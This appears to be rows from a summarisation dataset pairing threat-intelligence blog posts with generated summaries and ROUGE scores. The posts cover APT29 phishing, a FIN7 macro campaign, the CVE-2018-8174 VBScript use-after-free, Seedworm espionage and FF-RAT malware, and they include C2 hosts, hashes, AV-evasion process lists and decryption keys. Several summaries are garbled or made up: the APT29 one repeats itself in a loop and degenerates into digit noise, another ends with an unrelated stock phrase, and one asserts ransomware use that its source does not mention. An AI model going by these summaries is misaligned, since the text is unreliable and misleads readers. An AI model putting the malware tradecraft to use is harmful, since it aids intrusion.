%TEMP%\ds7002.PDF Benign decoy PDF file pathTable 2: IndicatorsRelated Samples37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d)FireEye DetectionFireEye detected this activity across our platform. Table 3 contains the specific detection names that applied to this activity.Product Detection names Network Security Malware.ArchiveMalware.Binary.lnkSuspicious.Backdoor.Beacon Endpoint Security SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)Generic.mg.16bbc967a8b6a365 Threat Analytics Platform WINDOWS METHODOLOGY [PowerShell Base64 String]WINDOWS METHODOLOGY [Rundll32 Roaming]WINDOWS METHODOLOGY [PowerShell Script Block Warning]WINDOWS METHODOLOGY [Base64 Char Args]TADPOLE DOWNLOADER [Rundll Args]INTEL HIT - IP [Structured Threat Reputation-Based]INTEL HIT - FQDN [Structured Threat Reputation-Based] [DNS]INTEL HIT - FQDN [Structured Threat Reputation-Based] [Non-DNS]INTEL HIT - FILE HASH [Structured Threat Reputation-Based]Table 3: FireEye product detections";FireEye has observed a phishing campaign targeting multiple industries, including think tank, law enforcement, media, U.S. military, imagery, transportation, pharmaceutical, national government, and defense contracting. The attacker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public Affairs official at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official's personal drive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available data, and there is no indication that the Department of State network was involved in this campaign. The attacker used unique links in each phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows shortcut file, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in with legitimate network traffic. Several elements from this campaign including the resources invested in the phishing email and network infrastructure, the metadata from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted are directly linked to the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and the possible intentions of this activity. Attribution Challenges Conclusive FireEye attribution is often obtained through our Mandiant consulting team's investigation of incidents at compromised organizations, to identify details of the attack and postcompromise activity at victims. FireEye is still analyzing this activity. There are several similar The ITSecurity report summarizes the malicious LNK used in the recent spearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), which has technical overlaps with a suspected APT29 LNK from November 2016, 37486theshockingtruthaboutelectionrigginginamerica.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly reported by Volexity. The 2018 and 2016 LNK files are similar in structure and code, and contain significant metadata overlap, including the MAC address of the system on which the LNK was created. Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK file. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns. Analysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this sophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by APT29 should take note of this activity. The Department of State has been targeted by an advanced persistent threat (APT) known as APT29. APT29 has been active since at least 2009 and is believed to be sponsored by a nationstate. APT29 has targeted a wide range of organizations, including government agencies, defense contractors, and technology companies. APT29 has used a variety of tactics, including spear phishing emails, malicious links, and malicious attachments. APT29 has also been known to use watering hole attacks, in which malicious code is placed on websites frequented by targeted organizations. APT29 has been known to use a variety of tools, including Cobalt Strike, PowerShell, and Metasploit. APT29 has been known to use a variety of tactics, including spear phishing emails, malicious links, and malicious attachments. APT29 has also been known to use watering hole attacks, in which malicious code is placed on websites frequented by targeted organizations. APT29 has been known to use a variety of tools, including Cobalt Strike, PowerShell, and Metasploit. APT29 has been known to use a variety of tactics, including spear phishing emails, malicious links, and malicious attachments. APT29 has also been known to use watering hole attacks, in which malicious code is placed on websites frequented by targeted organizations. APT29 has been known to use a variety of tools, including Cobalt Strike, PowerShell, and Metasploit. APT29 has been known to use a variety of tactics, including spear phishing emails, malicious links, and malicious attachments. APT29 has also been known to use watering hole attacks, in which . The report. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ynt. ays. ays. . . , 100000ight, andago, 10 ays. . . . . [. [. [. [. [. [. [. . . . 88888888. 8. 18. 1. 4. 10, 18. 8888 to the. [., 888888. [. [8888888. . 8. 8888888888888888888888.8. 8 FireEye detected this activity across our platform.;en;{'r': 0.2653061224489796, 'p': 0.8344594594594594, 'f': 0.4026079832992125};{'r': 0.21905805038335158, 'p': 0.7504690431519699, 'f': 0.33912674512444024};{'r': 0.2653061224489796, 'p': 0.8344594594594594, 'f': 0.4026079832992125}
https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign;FIN7 Not Finished – Morphisec Spots New Campaign;"This blog was co-authored by Alon Groisman.It seems like the rumors of FIN7's decline have been hasty. Just a few months after the well-publicized indictment of three high-ranking members in August, Morphisec has identified a new FIN7 campaign that appears to be targeting the restaurant industry.FIN7, also known as Carbanak, is one of the major threat groups tracked by Morphisec and numerous other security entities, and among the top three criminal computer intrusion cases that the FBI is currently working. FIN7 is composed of a very sophisticated network of developers and hackers and brings in an estimated $50 million a month. They target very specific industries, hospitality - hotels and restaurants - being one of them, and are behind a string of high-profile breaches including Red Robin, Chili's, Arby's, Burgerville, Omni Hotels and Saks Fifth Avenue, among many others.FIN7 is known for its stealth techniques and ability to continuously evade security systems. In the case of Burgerville, malware sat on the company's network collecting payment data for nearly a year before it was discovered. And that was only due to an FBI investigation.In this blog post, we present our findings on two campaigns, which occurred in the first and second weeks of November. These campaigns follow patterns similar to those presented by FireEye in August but with just enough variations to bypass many security vendors.Technical DescriptionThe initial document was probably sent within the Baltic region (or tested there). It was submitted to VirusTotal from Latvia. The name of the document translated from Russian is ""new questioner"". It is password-protected with the password: ""goodmorning"".Oprosnik_new.doc 6e1230088a34678726102353c622445e1f8b8b8c9ce1f025d11bfffd5017ca82)It uses social engineering to convince the recipient to enable macros through the use of the images, logo and tagline of a newly launched, legitimate VPN tool InvinciBull by cybersecurity company Finjan.If the ""enable macro"" button is activated, the following obfuscated Macro runs and the next stage obfuscated JavaScript is extracted from the form caption, similar to the last several FIN7 campaigns.Examining the metadata of the document, it clearly shows that the document was created on the 11.02.2018:Following deobfuscation of the macro, we notice known FIN7 patterns of executing JavaScript from VBScript with the slight modification of copying the wscript.exe file and renaming it to mses.exe. This may allow it to bypass some EDR solutions that are tracing WScript by name.Below is the obfuscated JavaScript that is written to the temp directory as error.txt file. The obfuscation pattern is similar to previously seen FIN7 patterns and most probably is a derivation of the same obfuscation toolkit.Deobfuscated JavaScriptThe deobfuscated JavaScript is actually a backdoor component that directly communicates to the C2 server (in this case hxxps://bing-cdn[.]com). It executes the response which is yet another JavaScript command, which can be evaluated by eval. Although there have been slight modifications in the Macro delivery in the last couple of campaigns, the JavaScript backdoor stays the same, including its communication protocol.During the first request, the MAC address and the computer domain are also delivered to the target C2. We believe that the next stage is only delivered to specific targets based on domains as the data that is delivered in the first request is very limited.Yara RulesSome additional observations that can be used to create Yara-rules for this campaign are the locations of the loaded VBControl files that are written in clear text as part of the document files:Additional SamplesAfter this search, we identified more samples that were created just a couple of days ago and point to a known C2 registered to the same entity (hxxps://googleapi-cdn[.]com)Below is a summary of information for one of those documents:The document was submitted from Ukraine (yet another former soviet union country) with the name ""dinners.doc"" (f5f8ab9863dc12d04731b1932fc3609742de68252c706952f31894fc21746bb8).The document again uses the social engineering technique of spoofing a known and trusted entity to convince the victim to enable macros.Based on the submission date and creation time, the document is sent to the target within 2-3 days.The macro is nearly identical to that described above except that wscript->script, errors->settings, has multiple captions instead of a single one.The JavaScript backdoor is decrypted into a similar backdoor:ConclusionLike the Hydra, cutting off one, or even three, heads of FIN7 barely slows it down. With the holiday rush nearly upon us, we expect the threat group to step up its activities to take advantage of increased email traffic flow and seasonal staff that may be less security conscious. Workers in any industry should stay vigilant against social engineering methods - although with today's highly targeted campaigns this can sometimes be tough to spot. And never enable macros unless you are 100 percent certain that the file is safe.";The ITSecurity report summarizes the threat posed by the FIN7 cybercrime group. The group has been active since at least 2016 and is known for its use of social engineering techniques to gain access to networks and steal sensitive data. The group is also known for its use of malware and ransomware to extort money from its victims. The report states that the group is likely to step up its activities during the holiday rush, taking advantage of increased email traffic flow and seasonal staff that may be less security conscious. Workers in any industry should stay vigilant against social engineering methods although with today's highly targeted campaigns this can sometimes be tough to spot. And never enable macros unless you are 100 percent certain that the file is safe.;en;{'r': 0.16666666666666666, 'p': 0.75, 'f': 0.2727272697520661};{'r': 0.08665749656121045, 'p': 0.5206611570247934, 'f': 0.148584903213805};{'r': 0.16435185185185186, 'p': 0.7395833333333334, 'f': 0.2689393909641874}
https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/;The King is dead. Long live the King!;"In late April 2018, a new zero-day vulnerability for Internet Explorer (IE) was found using our sandbox, more than two years since the last in the wild example (CVE-2016-0189). This particular vulnerability and subsequent exploit are interesting for many reasons. The following article will examine the core reasons behind the latest vulnerability, CVE-2018-8174.Searching for the zero dayOur story begins on VirusTotal (VT), where someone uploaded an interesting exploit on April 18, 2018. This exploit was detected by several AV vendors including Kaspersky, specifically by our generic heuristic logic for some older Microsoft Word exploits.After the malicious sample was processed in our sandbox system, we noticed that a fully patched version of Microsoft Word was successfully exploited. From this point we began a deeper analysis of the exploit. Let's take a look at the full infection chain:The infection chain consists of the following steps:A victim receives a malicious Microsoft Word document.After opening the malicious document, a second stage of the exploit is downloaded, an HTML page containing VBScript code.The VBScript code triggers a Use After Free (UAF) vulnerability and executes shellcode.Initial analysisWe'll start our analysis with the initial Rich Text Format (RTF) document, that was used to deliver the actual exploit for IE. It only contains one object, and its contents are obfuscated using a known obfuscation technique we call ""nibble drop"".After deobfuscation and hex-decoding of the object data, we can see that this is an OLE object that contains a URL Moniker CLSID. Because of this, the exploit initially resembles an older vulnerability leveraging the Microsoft HTA handler (CVE-2017-0199).With the CVE-2017-0199 vulnerability, Word tries to execute the file with the default file handler based on its attributes, the Content-Type HTTP header in the server's response being one of them. Because the default handler for the ""application/hta"" Content-Type is mshta.exe,it is chosen as the OLE server to run the script unrestricted. This allows an attacker to directly call ShellExecute and launch a payload of their choice.However, if we follow the embedded URL in the latest exploit, we can see that the content type in the server's response is not ""application/hta"", which was a requirement for CVE-2017-0199 exploitation, but rather ""text/html"". The default OLE server for ""text/html"" is mshtml.dll, which is a library that contains the engine, behind Internet Explorer.Furthermore, the page contains VBScript, which is loaded with a safemode flag set to its default value, '0xE'. Because this disallows an attacker from directly executing a payload, as was the case with the HTA handler, an Internet Explorer exploit is needed to overcome that.Using a URL moniker like that to load a remote web page is possible, because Microsoft's patch for Moniker-related vulnerabilities (CVE-2017-0199, CVE-2017-8570 and CVE-2017-8759) introduced an activation filter, which allows applications to specify which COM objects are restricted from instantiating at runtime.At the time of this analysis, the list of filtered CLSIDs consisted of 16 entries. TheMSHTML CLSID ({{25336920-03F9-11CF-8FD0-00AA00686F13}}) is not in the list, which is why the MSHTML COM server is successfully created in Word context.This is where it becomes interesting. Despite a Word document being the initial attack vector, the vulnerability is actually in VBScript, not in Microsoft Word. This is the first time we've seen a URL Moniker used to load an IE exploit, and we believe this technique will be used heavily by malware authors in the future. This technique allows one to load and render a web page using the IE engine, even if default browser on a victim's machine is set to something different.The VBScript in the downloaded HTML page contains both function names and integer values that are obfuscated.Vulnerability root cause analysisFor the root cause analysis we only need to look at the first function ('TriggerVuln') in the deobfuscated version which is called right after 'RandomizeValues' and 'CookieCheck'.To achieve the desired heap layout and to guarantee that the freed class object memory will be reused with the 'ClassToReuse' object, the exploit allocates some class objects. To trigger the vulnerability this code could be minimized to the following proof-of-concept (PoC):When we then launch this PoC in Internet Explorer with page heap enabled we can observe a crash at the OLEAUT32!VariantClear function.With this PoC we were able to trigger a Use-after-free vulnerability, both ArrA(1) and ArrB(1) were referencing the same 'ClassVuln' object in memory. This is possible because when ""Erase ArrA"" is called, the vbscript!VbsErase function determines that the type of the object to delete is a SafeArray, and then calls OLEAUT32!SafeArrayDestroy.It checks that the pointer to a tagSafeArray structure is not NULL and that its reference count, stored in the cLocks field is zero, and then continues to call ReleaseResources.ReleaseResources, in turn will check the fFeatures flags variable, and since we have an array of VARIANTs, it will subsequently call VariantClear, a function that iterates each member of an array and performs the necessary deinitialization and calls the relevant class destructor if necessary. In this case, VBScriptClass::Release is called to destroy the object correctly and handle destructors like Class_Terminate, since the VARTYPE of ArrA(1) is VT_DISPATCH.This ends up being the root cause of the vulnerability. Inside the VBScriptClass::Release function, the reference count is checked only once, at the beginning of the function. Even though it can be (and actually is, in the PoC) incremented in an overloaded TerminateClass function, no checks will be made before finally freeing the class object.Class_Terminate is a deprecated method, now replaced by the 'Finalize' procedure. It is used to free acquired resources during object destruction and is executed as soon as object is set to nothing and there are no more references to that object. In our case, the Class_Terminate method is overloaded, and when a call to VBScriptClass::TerminateClass is made, it is dispatched to the overloaded method instead. Inside of that overloaded method, another reference is created to the ArrA(1) member. At this point ArrB(1) references ArrA(1), which holds a soon to be freed ClassVuln object.After the Class_Terminate sub is finished, the object at ArrA(1) is freed, but ArrB(1) still maintains a reference to that freed class object. When the execution continues, and ArrB is erased, the whole cycle repeats, except that this time, ArrB(1) is referencing a freed ClassVuln object, and so we observe a crash when one of the virtual methods in the ClassVuln vtable is called.ConclusionIn this write up we analyzed the core reasons behind CVE-2018-8174, a particularly interesting Use-After-Free vulnerability that was possible due to incorrect object lifetime handling in the Class_Terminate VBScript method. The exploitation process is different from what we've seen in exploits for older vulnerabilities (CVE-2016-0189 and CVE-2014-6332) as the Godmode technique is no longer used. The full exploitation chain is as interesting as the vulnerability itself, but is out of scope of this article.With CVE-2018-8174 being the first public exploit to use a URL moniker to load an IE exploit in Word, we believe that this technique, unless fixed, will be heavily abused by attackers in the future, as It allows you force IE to load ignoring the default browser settings on a victim's system.We expect this vulnerability to become one of the most exploited in the near future, as it won't be long until exploit kit authors start abusing it in both drive-by (via browser) and spear-phishing (via document) campaigns. To stay protected, we recommend applying latest security updates, and using a security solution with behavior detection capabilities.In our opinion this is the same exploit which Qihoo360 Core Security Team called ""Double Kill"" in their recent publication. While this exploit is not limited to browser exploitation, it was reported as an IE zero day, which caused certain confusion in the security community.After finding this exploit we immediately shared the relevant information with Microsoft and they confirmed that it is in fact CVE-2018-8174, and received an acknowledgement for the report.This exploit was found in the wild and was used by an APT actor. More information about that APT actor and usage of the exploit is available to customers of Kaspersky Intelligence Reporting Service. Contact: intelreports@kaspersky.comDetectionKaspersky Lab products successfully detect and block all stages of the exploitation chain and payload with the following verdicts:HEUR:Exploit.MSOffice.Generic - RTF documentPDM:Exploit.Win32.Generic - IE exploit - detection with Automatic Exploit Prevention technologyHEUR:Exploit.Script.Generic - IE exploitHEUR:Trojan.Win32.Generic - PayloadIOCs";The latest exploit leverages a zeroday vulnerability for Internet Explorer (CVE20188174), which allows an attacker to remotely execute arbitrary code on a victim's system. The exploit uses a URL moniker to load a remote web page, which contains VBScript code. The VBScript code triggers a Use After Free (UAF) vulnerability and executes shellcode. The root cause of the vulnerability is that the reference count is checked only once, at the beginning of the function. Even though it can be (and actually is, in the PoC) incremented in an overloaded TerminateClass function, no checks will be made before finally freeing the class object. Class_Terminate is a deprecated method, now replaced by the 'Finalize' procedure. It is used to free acquired resources during object destruction and is executed as soon as object is set to nothing and there are no more references to that object. In our case, the Class_Terminate method is overloaded, and when a call to VBScriptClass::TerminateClass is made, it is dispatched to the overloaded method instead. Thank you for your input. We will take it into consideration.;en;{'r': 0.1821247892074199, 'p': 0.9, 'f': 0.3029452987432357};{'r': 0.11466011466011466, 'p': 0.8, 'f': 0.20057306370970887};{'r': 0.1821247892074199, 'p': 0.9, 'f': 0.3029452987432357}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/seedworm-espionage-group;Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms;Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America.The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018.Analysts in our DeepSight Managed Adversary and Threat Intelligence (MATI) team have found a new backdoor, Backdoor.Powemuddy, new variants of Seedworm's Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network.Tracking an Attack's FootprintsIn September 2018, we found evidence of Seedworm and the espionage group APT28 (aka Swallowtail, Fancy Bear), on a computer within the Brazil-based embassy of an oil-producing nation. Seeing two active groups piqued our interest and, as we began pulling on that one string, we found more clues that led us to uncover new information about Seedworm.We not only found the initial entry point, but we were able to follow Seedworm's subsequent activity after the initial infection due to the vast telemetry Symantec has access to via its Global Intelligence Network. Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network. We found new variants of the Powermud backdoor, a new backdoor (Backdoor.Powemuddy), and custom tools for stealing passwords, creating reverse shells, privilege escalation, and the use of the native Windows cabinet creation tool, makecab.exe, probably for compressing stolen data to be uploaded. DeepSight MATI customers can leverage these unique insights to combat emerging cyber threats.Seedworm's motivations are much like many cyber espionage groups that we observe--they seek to acquire actionable information about the targeted organizations and individuals. They accomplish this with a preference for speed and agility over operational security, which ultimately led to our identification of their key operational infrastructure.Tactics and ToolsSeedworm likely functions as a cyber espionage group to secure actionable intelligence that could benefit their sponsor's interests. During the operations, the group used tools consistent with those leveraged during past intrusions including Powermud, a custom tool used by the Seedworm group, and customized PowerShell, LaZagne, and Crackmapexec scripts.The Seedworm group controls its Powermud backdoor from behind a proxy network to hide the ultimate command-and-control (C&C) location. The Seedworm group is the only group known to use the Powermud backdoor.After compromising a system, typically by installing Powermud or Powemuddy, Seedworm first runs a tool that steals passwords saved in users' web browsers and email, demonstrating that access to the victim's email, social media, and chat accounts is one of their likely goals. Seedworm then uses open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. Seedworm uses off-the-shelf, unmodified versions of these tools as well as custom-compiled variants which we have determined are only used by this group.Shifting TacticsSince its existence first came to light, we've seen Seedworm modify the way it operates. Since early 2017, they have continually updated their Powermud backdoor and other tools to avoid detection and to thwart security researchers analyzing the tools. They've also used GitHub to store malware and a handful of publicly available tools, which they then customize to carry out their work.We have identified multiple online accounts that are likely associated with actors behind the Seedworm operations. The first finding was a public Github repository containing scripts that very closely match those observed in Seedworm operations. An additional link was then made to a persona on Twitter with similar profile data. This Twitter account follows numerous security researchers, including those who have written about the group in the past as well as developers who write the open-source tools they use.These accounts are likely controlled by the Seedworm group. The Github repository contains a PowerShell script that has been run on victim hosts in activity attributed to Seedworm, there are also numerous Crackmapexec PowerShell commands that match victim host activity.Choosing to rely on publicly available tools allows Seedworm to quickly update their operations by using code written by others and applying only small customizations. And they appear to adopt some of the most effective and capable tools, several of which--for these reasons--are also used by red team organizations.Targets and TimelineWe analyzed data on 131 victims that were compromised by Seedworm's Powermud backdoor from late September to mid-November 2018.;Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America.The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018.Analysts in our DeepSight Managed Adversary and Threat Intelligence (MATI) team have found a new backdoor, Backdoor.Powemuddy, new variants of Seedworm's Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several postcompromise tools the group uses to exploit victims once they have established a foothold in their network.Tracking an Attack's FootprintsIn September 2018, we found evidence of Seedworm and the espionage group APT28 (aka Swallowtail, Fancy Bear), on a computer within the Brazilbased embassy of an oilproducing nation. Seeing two active groups piqued our interest and, as we began pulling on that one string, we found more clues that led us to uncover new information about Seedworm.We not only found the initial entry point, but we were able to follow Seedworm's subsequent activity after the initial infection due to the vast telemetry Symantec has access to via its Global Intelligence Network. Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network. We found new variants of the Powermud backdoor, a new backdoor (Backdoor.Pow;en;{'r': 0.40616966580976865, 'p': 0.9753086419753086, 'f': 0.5735027181716793};{'r': 0.329971181556196, 'p': 0.9703389830508474, 'f': 0.49247311449221876};{'r': 0.40616966580976865, 'p': 0.9753086419753086, 'f': 0.5735027181716793}
https://blogs.blackberry.com/en/2017/06/breaking-down-ff-rat-malware;Threat Spotlight: Breaking Down FF-Rat Malware;"IntroductionFF-RAT is a family of malware used in a number of targeted attacks over at least the last five years. It is by no means a new threat, but it is still actively used and developed and worthy of a breakdown in an effort to defend against it.FF-Rat malware has managed to stay under the radar and does not yet have robust, widespread industry coverage. In this post, we're going to look at a recent sample the Threat Guidance team came across.The DropperThe sample we'll be analyzing is the main dropper component:SHA256: 7a4528821e4b26524ce9c33f04506616f57dfc6ef3ee8921da7b0c39ff254e4eThe first thing the dropper does is identify the architecture of the targeted host. If the host is a 64-bit system, then a 64-bit version of the dropper will be written to disk and executed, as shown below:Path: \%WinDir%\Temp\S[8 Byte Hex String].datSHA256: 8ef257058cbb22fbab54837dc0af1bdd93c2a6bae18ca4a26e0a436656e591e1Otherwise, if the host is a 32-bit system, then the 32-bit dropper will continue to its next phase of execution.Both droppers (32- and 64-bit) will proceed to decrypt and decompress an embedded DLL named SetupDll.dll. This DLL contains the primary functionality of the dropper, and is executed entirely in memory - never touching the disk. Next, we'll cover the process of extracting the DLL.Decoding and DecompressionThe recent dropper and different components of FF-RAT make heavy use of a combination of RC4, single byte XOR and LZ compression to protect the payloads and configuration. We have also observed older variants using aPACK instead of LZ compression.The basic workflow for the decryption and decompression looks like this:1) Generate the decryption key. The decryption key is generated by taking a hard coded DWORD and formatting it as an 8-byte hex string through a call to snprintf(). For example, given the value 0x12345678, the generated key would be ""12345678"" (Figure 1):Figure 1: The Decryption Key is Formatted Through a Call to snprintf()2) Decrypt the payload using RC4 and the key generated from the call to snprintf()3) Decompress the decrypted payload through a call to RtlDecompressBuffer(). Rather than importing this function, it's called through a wrapper, which obtains the address by calling Loadlibrary followed by GetProcAddress (Figure 2).Figure 2: RTLDecompressBuffer FunctionFor the payload (SetupDll.dll) mentioned above, the value 0x3D65308E is turned into the hex string ""3D65308E"" through a call to snprintf(). The payload located at 0x407074 is then decrypted using the key ""3D65308E"". The last step of unpacking the payload is accomplished by a call to RTLDecompressBuffer to complete the decompression.Understanding this process allows a researcher to place a breakpoint on the call to RTLDecompressBuffer to easily extract Setup.dll after it's been decrypted and decompressed (Figure 3):Figure 3: X64dbg is Used to Dump the Payload By Setting a Breakpoint On the Call to RTLDecompressbufferSetupDll.dllSetupDll.dll contains the core functionality of the dropper and is executed from within the dropper by calling the exported function SetupWork.SetupWork makes a series of checks for the following:AV-Related Processes360rp.exe avgidsagent.exe KSafeSvc.exe RsTray.exe 360rps.exe avgnsx.exe KSafeSvc.exe seccenter.aye 360rps.exe avgrsx.exe KSafeTray.exe vsserv.aye 360Safe.exe avgrsx.exe kxescore.exe ZhuDongFangYu.exe 360sd.exe avgui.exe kxetray.exe 360Tray.exe avgwdsvc.exe odscanui.aye AvastSvc.exe avp.exe QQPCRTP.exe AvastUI.exe BaiduSd.exe QQPCTray.exe AvastUI.exe BaiduSdSvc.exe RavMonD.exe avgcsrvx.exe bdagent.aye RsMgrSvc.exeFile Objects:\\.\\fstabNamed Events:Global\1224DC7B-DEE0-4903-ABCA-917778626DDGlobal\2BC2426F-C8E6-47a7-9C8A-356A219F83ADGlobal\4822063B-F74F-4eb5-B257-1E7BAD1BD8CEIf the check succeeds, it proceeds to write the backdoor to disk:Path: %WinDir%\system32\RCoResX64.datSHA256: b01e5b5ea94a39eb3a80339987c68ae4cb8b90e68f9c794d01d6c3ac1fb8759fFollowed by the configuration data:Path: C:\Windows\Media\WindowsMainSound.wavRegistry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\{6CD70ECA-9CA1-4862-B00C-BACA47548B1B}\ConfigInfoFigure 4. Encrypted Configuration Stored in the RegistryBoth the backdoor (RCoResX64.dat) and the configuration (WindowsMainSound.wav) are time stomped using the MAC time of the csrss.exe executable found in the System32 directory.Persistence is achieved by creating a service using one of the names below:IrmonNwsapagentNWCWorkstationIpripService Details:Our analysis has revealed that, although it wasn't enabled in the configuration for this sample, SetupDll.dll has the ability to infect the MBR with a bootkit. This allows the malware to gain execution early in the boot process, maintain persistence, and can make remediation more difficult. We will be covering this component in more detail in a follow up to this blog.Figure 5: Infected MBR Extracted From SetupDll.dllNow that we've discussed the dropper and payload extraction, we can move on to the backdoor.RCoResX64.datMuch like the dropper, the core functionality is contained within a compressed and encrypted DLL that is only resident in memory. Just like before, the DLL is extracted through the use of RC4 and RTLDecompressBuffer(). This time, the payload is located at offset 0x10004094 and the value 0x429C20CA is converted to the hex string ""429C20CA"" and used as the decryption key.Next, the encrypted configuration is loaded from the registry:Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\{6CD70ECA-9CA1-4862-B00C-BACA47548B1B}\ConfigInfoIf the backdoor is unsuccessful in loading the configuration from the registry, it is loaded from disk:Path: C:\Windows\Media\WindowsMainSound.wavFigure 6: Decrypted Configuration Dumped From MemoryAt this point, FF-Rat will attempt to connect out to the command and control servers listed in the configuration:rp.gamepoer7.com:80dns1-1.verifysign.org:53login.gamepoer7.com:443The communication with the command and control server is done over HTTP:Figure 7. HTTP Post Over Port 53Something that may be of interest to network defenders is the format of the string used for the URI: ""/%s.php?hdr_ctx=%d_%d"" and the hard coded User-Agent: ""Mozilla/5.0"".The data exchanged with the command and control server is single byte XOR encoded with the key 0x57. The requests download additional code from the command and control server, which is then stored in the registry and executed in memory.If the target is behind an authenticated proxy that would block the connection to the command and control server, the backdoor has the ability to authenticate to the proxy as the currently logged in user. These requests use the hard-coded User-Agent: ""Mozilla/4.0 (compatible, MSIE 6.0, Windows NT 5.1, SV1)"".Debug StringsThe dropper and DLL have many occurrences of OutPutDebugStringA() throughout their code. This may be an indication that FF-RAT is still under development. A tool such as DebugView can be used to capture this debug information as the malware executes.Figure 8: Debug Messages From FF-RAT Execution Captured With Sysinternals DebugViewConclusionFF-RAT is an effective, proxy-aware RAT that has been in use for at least the last five years. It has been observed being used in targeted attacks against a number of different industries, including government, aerospace, gaming, IT, and telecommunications. Infecting a system with FF-RAT gives attackers unfettered access to that system and can have a significant impact on an organization.The malware author goes through a lot of trouble to obfuscate key components and make sure they never touch disk. In our analysis, we covered the Dropper, DLL component and obfuscation techniques. We also provided a number of indicators that can help identify an infection.If you use our endpoint protection product CylancePROTECT(r), you were already protected from this attack. If you don't have CylancePROTECT, contact us to learn how our AI-driven solution can predict and prevent unknown and emerging threats.Indicators of CompromiseSHA-256 Hashes:FF-RAT 64-bit Droppers:6E262EDE79284EB4111ABAE6A6DCFE713DB94184F87C6904EC6729E477FB11BA8EF257058CBB22FBAB54837DC0AF1BDD93C2A6BAE18CA4A26E0A436656E591E19CDAAD7554B1B39FDAF0E5F0AD41E7006D36E0F9791DC9C1CF3D50B73F6CA9079DE5EE57D9CA1800A442D3F53E43B22807B411FF1839C1A242E21254C3B40A49AECAAD397351C6466E0B5D16CAEB318BF3AFD2946BC8C5FA21BDFCE02924C74EC9FEEDC43D4D2DE56A819D7056A24B71C74368B055DDEDAA10A4AAC22B9C1CCEFF-RAT 32-bit Droppers:7A4528821E4B26524CE9C33F04506616F57DFC6EF3EE8921DA7B0C39FF254E4E039E9036DEA6A7609BE87EB83CF0738137A8ED3CFB46A611A9CB4B06BEC147750E0B579501ABC8F7D2E41B14C76188267F1CECBBCBC2C78B845C5AA6D328731B306A5298793EEF46C53FC1CC27AA5851120E186E9891445C309FC8410E1A1B243E1E11C9551B9C26FD9E7E379206A506172FCCC73DADF60F930F3CA1D1BA107753147EB4709DB10E835A9CEA62DC52276EBA14D54F7C26709C4948734ACA19FD58116F5C0DACFD7D70A9E57E6328E7105667BB14032DEE6F905C271560767BEB5918335629A3AFBA3D8A384B59D574327F0F583998AC2ECE4AB84A98B65D6233610D80BF2F1F335A539684C329F87721EF5B7362A22E263709BBE3F18494095A62ACDC9DBB35C16C770F97C1CD3D65BC1848E60FAD8E9828758C12FDC0BC8A64691BC271B1724C5DC8C6DDE185B49A465E73EC18380EF900732EA93637ADD24B7ED4FCB7733620B7D3FE0BCE2351907723FDEF373F053A865D12AEBA3FBE0722842E7D030221E10804AF926B783FA5C75EEE009AC74CC22C6D1E6507C53AD45387D5F1E504D02D31741A4D175699FD82F88AB7441D9908DD4F2EEBD28B1B36EB8C44625E027DB0A1D8CFAD60DA9102E092F7EC69C638DC0BF5FF97665E449FD1903AA33253FD8CEECB6FE8D7A9076A650F318433939480D8BD44F2BA240977F197DDBF427BF887237B1A9C7C0DD85C8F64390F4EBE2CA0D1FC0A292FB4FCC71AAE6C390FF56A6E83442E0758E7FB15E6A64B96BC022DE6E56D2CFD44E7094667E1F564C466E60DDBA8FA437241EE109A2FB012C929A56D7FEEF65B67AF4B407EEAD6378FCF5FD35A15D9DFA0089834EDF636DE9EED73E66FF37CA8F42F1C5F2CF194B96317B38512F71BC3CBD070FCD19DBA49BE92EACF430376C54BFD8FE15CFEE2749D2F88CADB77FAEDE6DA6FABCF23D01E6C39AE1B74BD29AC02CCEAD1CCFF68BBC1F0EB49B75B940E873BF9F4710B9F566B34FA0543238F9D2A739FD27CFF96D09E3FE618A296DC5B4425224831DBB49877BE054276DA5BAEFCC52E0F53FF-RAT 64-bit 